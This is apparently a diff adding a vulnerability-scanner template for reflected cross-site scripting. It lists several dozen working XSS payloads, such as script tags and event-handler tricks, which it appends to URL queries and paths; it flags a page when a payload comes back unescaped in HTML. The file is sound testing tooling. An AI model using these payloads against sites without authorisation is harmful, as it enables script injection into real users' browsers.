@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<script>alert(1)</script>"
+        - "<map id=x tabindex=1 onfocusin=alert(1)></map>"
+        - "<multicol id=x tabindex=1 onactivate=alert(1)></multicol><input autofocus>"
+        - "<script src=\"data:\\x0Btext\\x2Fjavascript:alert(1)\"></script>"
+        - "<plaintext onbeforepaste=\"alert(1)\" contenteditable>test</plaintext>"
+        - "<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>"
+        - "<svg><img src=xxx:x/onerror=\"alert(1)\" width=200 height=50>"
+        - "<style>@keyframes x{}</style><rtc style=\"animation-name:x\" onanimationend=\"alert(1)\"></rtc>"
+        - "</div><img src=xxx:x onerror=javascript:alert(1)//"
+        - "<script>alert(1)</script><noscript>"
+        - "<mark onkeyup=\"alert(1)\" contenteditable>test</mark>"
+        - "<style>@keyframes x{}</style><th style=\"animation-name:x\" onanimationend=\"alert(1)\"></th>"
+        - "<body onkeyup=\"alert(1)\" contenteditable>test</body>"
+        - "<style>:target {color:red;}</style><pre id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></pre>"
+        - "<font id=x tabindex=1 onfocusin=alert(1)></font>"
+        - "<style>@keyframes slidein {}</style><fieldset style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></fieldset>"
+        - "<bdi draggable=\"true\" ondragend=\"alert(1)\">test</bdi>"
+        - "<input autofocus><input autofocus>"
+        - "<output onclick=\"alert(1)\">test</output>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></link>"
+        - "<IMG SRC=x onscroll=alert(String.fromCharCode(88,83,83))//>"
+        - "</br><img src=xxx:x onerror=\\x0Bjavascript:alert(1)>"
+        - "<svg/onload=alert(1)></svg>"
+        - "<video id=x tabindex=1 onactivate=alert(1)></video><input autofocus>"
+        - "<video autoplay onerror=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<basefont draggable=\"true\" ondragleave=\"alert(1)\">test</basefont>"
+        - "<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>"
+        - "<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>"
+        - "<SCRIPT>alert('XSS');</SCRIPT>"
+        - "</br><svg/onload=alert(1)>"
+        - "<dialog draggable=\"true\" ondragleave=\"alert(1)\">test</dialog>"
+        - "<svg><template onloadend=alert(1)></template>"
+        - "<audio autoplay controls onprogress=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<video controls autoplay muted onended=alert(1)><source src=\"valid_video.mp4\" type=\"video/mp4\"></video>"
+        - "&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;<script>alert('XSS');</script>"
+        - "<colgroup draggable=\"true\" ondragend=\"alert(1)\">test</colgroup>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del><input autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><kbd id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></kbd>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></tr>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<iframe oncontextmenu=\"alert(1)\">test</iframe>"
+        - "<video poster=validimage.png onerror=alert(1)></video>"
+        - "<style>@keyframes x{}</style><time style=\"animation-name:x\" onanimationstart=\"alert(1)\"></time>"
+        - "<del onbeforecut=\"alert(1)\" contenteditable>test</del>"
+        - "<svg onload=alert(1)>"
+        - "<;DIV STYLE=\"\";width:expression(javascript:alert(';XSS';));\";"
+        - "<svg><img onload=alert(1)"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
